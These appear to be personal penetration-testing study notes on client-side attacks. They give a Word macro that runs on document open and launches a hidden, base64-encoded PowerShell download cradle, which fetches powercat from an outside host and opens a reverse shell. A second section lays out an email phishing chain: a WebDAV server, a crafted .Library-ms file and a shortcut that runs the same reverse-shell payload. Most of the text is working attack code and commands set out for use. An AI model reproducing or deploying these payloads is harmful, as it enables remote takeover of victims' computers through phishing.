

---
---
# Using Macros

```c
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.1.10/powercat.ps1') | IEX;powercat -c 192.168.xxx.xxx -p 4444 -e powershell"
    Shell str, vbHide
End Sub

```

> the encoding should be  UTF16 base64 also i should make every 50 chrar on a line 

```python
encoded_str = "powershell.exe -nop -w hidden -e AEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADEAOQAuADIALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4AMQAxADkALgAyACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw="

n = 50

for i in range(0, len(encoded_str), n):
    print("Str = Str + " + '"' + encoded_str[i:i+n] + '"')
```


> The final Result should be like : 

```c
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
    Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
    Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC40NS4yNDkvcG93ZXJjYXQucHM"
    Str = Str + "xJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4yNDkgLXAgNDQ0N"
    Str = Str + "CAtZSBwb3dlcnNoZWxs"
    
    CreateObject("Wscript.Shell").Run Str
End Sub
```

> UTF16 base64 this 

```c
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

---
---
# Phishing Using Email


> install the web server 

```c
kali@kali:~$ pip3 install wsgidav           
Defaulting to user installation because normal site-packages is not writeable
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 171.3/171.3 KB 1.6 MB/s eta 0:00:00
...  
Successfully installed json5-0.9.6 wsgidav-4.0.1    
```

> create a directory to host the webserver and touch a file 

```c
kali@kali:~$ mkdir /home/kali/webdav

kali@kali:~$ touch /home/kali/webdav/test.txt
```

> Launch the web server

```c
 /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

> NExt open the windows  machine and create a new file via visual studio with the name `config.Library-ms`  with this content


```c
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

after that close the program and re open , the value of the url should be edited 

> next create a shortcut with this content 

```c
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```

dont forget to open a webserver on port 8000 and a listener on port 4444 

and put the shortcut on the ms-library.conf 

and finaly transfer the file to linux in order to send the email , or via smb anything that the user check include the frp 

---
---
